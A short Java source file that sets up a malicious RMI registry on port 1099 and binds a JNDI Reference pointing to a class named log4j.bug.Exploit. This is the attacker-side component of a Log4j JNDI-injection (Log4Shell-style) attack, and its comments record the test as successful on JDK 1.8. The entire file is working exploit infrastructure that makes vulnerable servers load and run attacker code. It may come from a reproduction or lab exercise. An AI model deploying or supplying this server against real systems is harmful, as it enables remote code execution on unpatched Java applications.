package log4j.bug;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * 环境：jdk1.8.0_152
 * 结果：测试成功
 */
public class RMIServer {

  public static void main(String[] args) {
    try {
      LocateRegistry.createRegistry(1099);
      Registry registry = LocateRegistry.getRegistry();
      Reference reference = new Reference("log4j.bug.Exploit",
          "log4j.bug.Exploit", null);
      ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);

      registry.bind("Exploit", referenceWrapper);

    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}